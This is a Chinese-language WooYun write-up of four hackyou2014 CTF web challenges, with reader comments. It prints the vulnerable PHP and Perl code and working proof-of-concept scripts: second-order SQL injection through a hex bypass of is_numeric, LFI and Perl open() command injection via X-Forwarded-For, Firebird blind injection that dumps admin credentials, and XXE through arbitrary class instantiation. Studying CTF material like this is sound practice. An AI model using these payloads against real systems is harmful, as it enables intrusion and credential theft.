@@ -1,0 +1,249 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">hackyou2014 CTF web关卡通关攻略</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2014/01/21 18:57" ui-time="" datetime="2014/01/21 18:57" class="published ng-binding ng-isolate-scope">2014/01/21 18:57</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>作者：Mickey,瞌睡龙</p><p>所有文件已打包可自己搭建测试：</p><p><a href="http://static.wooyun.org/20141017/2014101711044119266.zip">CTF.zip</a></p><h2>第一关</h2><hr><p><a href="http://hackyou2014tasks.ctf.su:10080/">http://hackyou2014tasks.ctf.su:10080/</a></p><p>打开网页，通过看源代码发现有</p><pre><code>#!html
+&lt;!-- TODO: remove index.phps --&gt;
+</code></pre><p>尝试访问index.phps，如图1，</p><p><img alt="2014012112115741016.png" img-src="50391a4c8c38d7bbdae4a355f058e7adb0ea1d58.jpg"></p><p>通过查看index.phps,发现源代码如下：</p><pre><code>#!php
+&lt;?php
+include 'db.php';
+session_start();
+if (!isset($_SESSION['login'])) {
+    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
+}
+$login = $_SESSION['login'];
+
+if (isset($_POST['submit'])) {
+    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
+        die('Hacking attempt!');
+    $id = $_POST['id'];
+    $vote = (int)$_POST['vote'];
+    if ($vote &gt; 5 || $vote &lt; 1)
+        $vote = 1;
+    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
+    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
+    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';
+    echo '&lt;table border="1"&gt;';
+    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
+    while ($r = mysql_fetch_array($q)) {
+        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
+        echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
+        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
+        echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;';
+    }
+    echo '&lt;/table&gt;';
+    echo '&lt;br&gt;&lt;a href="index.php"&gt;Back&lt;/a&gt;&lt;br&gt;';
+    exit;
+}
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Picture Gallery&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;Welcome, &lt;?php echo $login; ?&gt;&lt;/p&gt;
+&lt;p&gt;Help us to choose the best logo!&lt;/p&gt;
+&lt;form action="index.php" method="POST"&gt;
+&lt;table border="1" cellspacing="5"&gt;
+&lt;tr&gt;
+&lt;?php
+$q = mysql_query('SELECT * FROM picture');
+while ($r = mysql_fetch_array($q)) {
+    echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';
+}
+?&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;p&gt;Your vote:
+&lt;select name="vote"&gt;
+&lt;option value="1"&gt;1&lt;/option&gt;
+&lt;option value="2"&gt;2&lt;/option&gt;
+&lt;option value="3"&gt;3&lt;/option&gt;
+&lt;option value="4"&gt;4&lt;/option&gt;
+&lt;option value="5"&gt;5&lt;/option&gt;
+&lt;/select&gt;&lt;/p&gt;
+&lt;input type="submit" name="submit" value="Submit"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- TODO: remove index.phps --&gt;
+</code></pre><p>其中id是被is_numeric过滤后，插入到vote表里的，可以用十六进制或者二进制绕过is_numeric,把注入查询语句插入到vote表里，然后又从vote表里取出，形成二次注入。</p><p>POC如下：</p><pre><code>#!python
+#!/usr/bin/env python
+import requests
+import binascii
+import sys
+
+def hack(inject):
+    vul={'id':inject,'vote':3,'submit':1}
+    req=requests.post('http://hackyou2014tasks.ctf.su:10080/index.php',data=vul)
+    print req.content
+
+if __name__=="__main__":
+    hack("0x" + binascii.hexlify(sys.argv[1]))
+</code></pre><p>效果图如2</p><p><img alt="2014012112121549265.png" img-src="967be60175fa6eac096273869cd5befc62b73d58.jpg"></p><h2>第二关</h2><hr><p><a href="http://hackyou2014tasks.ctf.su:20080/">http://hackyou2014tasks.ctf.su:20080/</a></p><p>这关打开后是个贪吃蛇游戏，只有注册用户才能保存结果，我们注册一个用户babybox，玩完游戏后访问后台，发现有个ip参数值得注意，尝试提交</p><pre><code>http://hackyou2014tasks.ctf.su:20080/cgi-bin/index.pl?ip=../../../../../../var/www/cgi-bin/index.pl
+</code></pre><p>发现有LFI，如图3</p><p><img alt="2014012112125366530.png" img-src="5736028010fc1da0ff93f902eb0d43716a5e9f72.jpg"></p><p>通过读取到的index.pl源码可以发现，</p><pre><code>#!perl
+$login = $session-&gt;param('login');
+print $req-&gt;p('Hello, '.$login.'!');
+if ($req-&gt;param('ip')) {
+    $file = './data/'.MD5($login)."/".$req-&gt;param('ip');
+    if (-e $file) {
+        open FILE, $file;
+        $html = '';
+        while (&lt;FILE&gt;) {
+            $html .= $_;
+        }
+        close(FILE);
+        print $req-&gt;start_table({border=&gt;1});
+        print $req-&gt;Tr($req-&gt;th(['Date', 'Score']));
+        print $html;
+        print $req-&gt;end_table();
+        print $req-&gt;a({href=&gt;'index.pl'}, 'Back');
+    } else {
+        print $req-&gt;h1('Error');
+    }
+}
+</code></pre><p>其中的open函数，可以导致命令执行，下载火狐的X-Forwarded-For Header插件，设置X-Forwarded-For为|pwd|，然后玩游戏，进后台看成绩，提交</p><pre><code>http://hackyou2014tasks.ctf.su:20080/cgi-bin/index.pl?ip=|pwd|
+</code></pre><p>发现命令注入成功了。由于这里不能使用/和\字符，我们可以使用base64编码下，如图4</p><p>这之前需要在提交成绩的时候X-Forwarded-For改为</p><pre><code>|`echo bHMgLw== | base64 -d`|
+</code></pre><p><img alt="2014012112130828316.png" img-src="fa9b4a6b7f7f38e0538ac11505245a9567db1c25.jpg"></p><h2>第三关</h2><hr><p><a href="http://hackyou2014tasks.ctf.su:30080/">http://hackyou2014tasks.ctf.su:30080/</a></p><p>这关可分为两部分</p><pre><code>1、找到隐藏的管理后台
+2、盲注获取权限
+</code></pre><p>找到隐藏的管理后台需要利用windows平台上的一个技巧，具体的研究测试报告可以看这里：</p><p><a href="http://onsec.ru/onsec.whitepaper-02.eng.pdf">Windows+PHP bug realted with findfirstfile</a></p><p>php的某些函数获取文件时，可以使用<code>&lt;</code>代替其他字符进行猜解。</p><pre><code>p&lt;&lt;
+</code></pre><p>表示</p><pre><code>p*
+</code></pre><p>include_once函数包含文件将会返回以p开头的第一个文件，这里返回了phpinfo()的信息。</p><p>可以知道后台的数据库是firebird，如图5，</p><p><img alt="2014012112133660316.png" img-src="b8895ff76594126f5cb4e50a39d63858843649a0.jpg"></p><p>然后猜解后台目录：</p><pre><code>http://hackyou2014tasks.ctf.su:30080/index.php?page=0&lt;&lt;
+http://hackyou2014tasks.ctf.su:30080/index.php?page=0a&lt;&lt;
+</code></pre><p>根据页面返回当中是否有</p><pre><code>Page does not exists
+</code></pre><p>字符串，来判断猜解的字符串是否正确。</p><p>然后用burpsuite去猜测剩余的字符，全部猜测成功后，发现</p><pre><code>http://hackyou2014tasks.ctf.su:30080/0a5d2eb35b90e338ed481893af7a6d78/index.php
+</code></pre><p>是个后台登陆口，没有账号，继续翻前台，发现</p><pre><code>http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost
+</code></pre><p>有注入</p><pre><code>http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost ASC
+</code></pre><p>其实看到order参数，就很容易猜测可能是order by语句后的注入 :)</p><p>针对这个场景，firebird数据库，可控语句在order by之后，只能采取盲注：</p><p>已有人写好跑数据的perl脚本：</p><pre><code>#!perl
+use LWP::Simple;
+#username:password
+#admin:9shS3FAk
+
+# extract columns from USERS
+
+$url="http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=";
+
+$fst="case when(1=(select first 1 1 from rdb\$relation_fields where lower(RDB\$RELATION_NAME)=ascii_char(117)||ascii_char(115)||ascii_char(101)||ascii_char(114)||ascii_char(115) and lower(rdb\$field_name) LIKE ";
+$snd="||ascii_char(37) )) then (select first 1 1 from rdb\$relations) else (select first 2 1 from rdb\$relations) end";
+$b=0;
+
+
+# LOGIN column part
+for($j=0;$j&lt;100;$j++){
+for($i=97;$i&lt;122;$i++){
+        $sql=$url.$fst."ascii_char(".$i.")".$snd;
+        #print "j: ".$j." i:".$i."\n";
+        $html=get $sql;
+        if ($html=~/1337/ &amp;&amp; $i!=37 &amp;&amp; $i!=95){
+                print chr($i);
+                $fst.="ascii_char(".$i.")||";
+
+                last;
+        }else{
+                $b++;
+        }
+}
+if($b==122-97){
+        last;
+}else{
+$b=0;
+}
+}
+print "\n";
+
+# PASSWD column part
+$fst="case when(1=(select first 1 1 from rdb\$relation_fields where lower(RDB\$RELATION_NAME)=ascii_char(117)||ascii_char(115)||ascii_char(101)||ascii_char(114)||ascii_char(115) and lower(rdb\$field_name) LIKE ";
+$b=0;
+for($j=0;$j&lt;100;$j++){
+for($i=97;$i&lt;122;$i++){
+        $sql=$url.$fst."ascii_char(".$i.")".$snd;
+
+        $html=get $sql;
+        if ($html=~/1337/ &amp;&amp; $i!=37 &amp;&amp; $i!=95 &amp;&amp; $i!=108){
+                print chr($i);
+                $fst.="ascii_char(".$i.")||";
+                last;
+        }else{
+                $b++;
+        }
+}
+if($b==122-97){
+        last;
+}else{
+$b=0;
+}
+}
+print "\n";
+
+#extract data from USERS ( LOGIN,PASSWD)
+
+$fst="case when(1=(select first 1 1 from USERS where LOGIN LIKE ";
+$snd="||ascii_char(37) )) then (select first 1 1 from rdb\$relations) else (select first 2 1 from rdb\$relations) end";
+for($j=0;$j&lt;100;$j++){
+for($i=65;$i&lt;=122;$i++){
+        $sql=$url.$fst."ascii_char(".$i.")".$snd;
+        #print $j." ".$i."\n";
+
+        $html=get $sql;
+        if ($html=~/1337/ &amp;&amp; $i!=37 &amp;&amp; $i!=95){
+                print chr($i)."\n";
+                $fst.="ascii_char(".$i.")||";
+                last;
+        }else{
+                $b++;
+        }
+}
+if($b==123-65){
+        last;
+}else{
+$b=0;
+}
+}
+print "\n";
+
+$fst="case when(1=(select first 1 1 from USERS where PASSWD LIKE ";
+$snd="||ascii_char(37) )) then (select first 1 1 from rdb\$relations) else (select first 2 1 from rdb\$relations) end";
+for($j=0;$j&lt;100;$j++){
+for($i=48;$i&lt;=122;$i++){
+        $sql=$url.$fst."ascii_char(".$i.")".$snd;
+        #print $j." ".$i."\n";
+
+        $html=get $sql;
+        if ($html=~/1337/ &amp;&amp; $i!=37 &amp;&amp; $i!=95){
+                print chr($i)."\n";
+                $fst.="ascii_char(".$i.")||";
+                last;
+        }else{
+                $b++;
+        }
+}
+if($b==123-48){
+        last;
+}else{
+$b=0;
+}
+}
+print "\n";
+</code></pre><p>最后可以看到数据为：</p><pre><code>admin
+9shS3FAk
+</code></pre><p>到登陆页面登陆即可过关。</p><h2>第四关</h2><hr><p>这关提供源码下载了，<a href="http://hackyou.ctf.su/files/web400.zip">http://hackyou.ctf.su/files/web400.zip</a></p><pre><code>#!php
+&lt;?php
+include 'config.php';
+include 'classes.php';
+$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
+$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
+$page = new $action($param);
+echo $page;
+?&gt;
+</code></pre><p>看这行</p><pre><code>#!php
+$page = new $action($param);
+</code></pre><p>我们能实例化任意的类，并且传递$param给构造函数，我们先拿SimpleXMLElement看看效果</p><p><a href="http://cn2.php.net/manual/en/simplexmlelement.construct.php">http://cn2.php.net/manual/en/simplexmlelement.construct.php</a></p><p>POC如下：</p><pre><code>#!python
+#!/usr/bin/env python
+import requests
+import sys
+import base64
+
+def hack(inject):
+    vul={'param':'&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "' + inject + '" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;'}
+    req=requests.post('http://hackyou2014tasks.ctf.su:40080/index.php?action=SimpleXMLElement',data=vul)
+    print base64.b64decode(req.content)
+
+if __name__=="__main__":
+    hack(sys.argv[1])
+</code></pre><p>效果如图6:</p><p><img alt="2014012112143046600.png" img-src="4e09babdbc5f52102d5addb19bc95baac90e9060.jpg"></p><p>也可以用SplFileObject</p><p><a href="http://cn2.php.net/manual/en/splfileobject.construct.php">http://cn2.php.net/manual/en/splfileobject.construct.php</a></p><p>效果图如7:</p><p><img alt="2014012112144854244.png" img-src="175c7a3abf4a66877b18bd64b25bd4dd9c5640f0.jpg"></p><p>最后用GlobIterator得到结果</p><p><a href="http://cn2.php.net/manual/en/globiterator.construct.php">http://cn2.php.net/manual/en/globiterator.construct.php</a></p><p>效果图如8:</p><p><img alt="2014012112150472274.png" img-src="ac21f57e3e4d781e02bdfa4e6ef81181884a51c8.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">vvvvvv</span> <span class="reply-time">2016-06-04 12:22:21</span></div><p></p><p>碉堡了，但是看不懂！whctf求援助</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Soulmk</span> <span class="reply-time">2015-10-17 23:45:30</span></div><p></p><p>看得很压抑~但又涨姿势了~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dentist salary nc</span> <span class="reply-time">2014-09-27 02:56:24</span></div><p></p><p><strong>dentist salary nc...</strong></p><p>hackyou2014 CTF web关卡通关攻略 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黑吃黑</span> <span class="reply-time">2014-08-05 10:27:46</span></div><p></p><p>我擦，为什么我看不懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">数据流</span> <span class="reply-time">2014-07-23 14:49:00</span></div><p></p><p>吊炸天</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-17 20:14:27</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">YHHK</span> <span class="reply-time">2014-03-09 10:59:39</span></div><p></p><p>BCTF求助攻。。。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xeyes</span> <span class="reply-time">2014-02-11 17:17:58</span></div><p></p><p>高端，大气，上档次。 mickey 牛碉堡了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bloodwolf</span> <span class="reply-time">2014-02-08 16:41:15</span></div><p></p><p>看了以后压抑啊，心情不爽，真想说下次有这事请叫上兄弟一起上</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-01-31 02:13:41</span></div><p></p><p>看得心情压抑，转行算了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">noob</span> <span class="reply-time">2014-01-28 17:29:40</span></div><p></p><p>膜拜</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2014-01-24 10:29:40</span></div><p></p><p>尼玛屌爆了，膜拜~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-01-22 15:35:20</span></div><p></p><p>我们小组的就是牛逼啊，各种高大上文章</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-01-22 14:46:01</span></div><p></p><p>非常经典，同样的字符串对于php来说和mysql是理解不一致的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-01-22 14:37:35</span></div><p></p><p>其中id是被is_numeric过滤后，插入到vote表里的，可以用十六进制或者二进制绕过is_numeric</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">天梭</span> <span class="reply-time">2014-01-22 13:46:43</span></div><p></p><p>仰望！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2014-01-22 13:01:24</span></div><p></p><p>id 是字符型的.数字型不会出现，经典2次注入方法。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Elegance</span> <span class="reply-time">2014-01-22 11:37:29</span></div><p></p><p>碉堡了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">horseluke</span> <span class="reply-time">2014-01-22 11:07:35</span></div><p></p><p>第一关就不懂了...似乎出题者将数据库的id字段设计成char/varchar等字符串类型导致的，如果换成int等数字型类型，会不会没有这种漏洞？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coner</span> <span class="reply-time">2014-01-22 09:47:22</span></div><p></p><p>Mickey好吊啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">CnCxzSec(衰仔)</span> <span class="reply-time">2014-01-22 09:24:26</span></div><p></p><p>吊炸天</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌云</span> <span class="reply-time">2014-01-21 22:09:05</span></div><p></p><p>膜拜！！！表示看了一关看不下去了。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">骨灰</span> <span class="reply-time">2014-01-21 21:02:46</span></div><p></p><p>膜拜神牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">心伤的胖子</span> <span class="reply-time">2014-01-21 19:16:31</span></div><p></p><p>学习了，顶两个牛！</p><p></p></div></div></div></div></div></main>
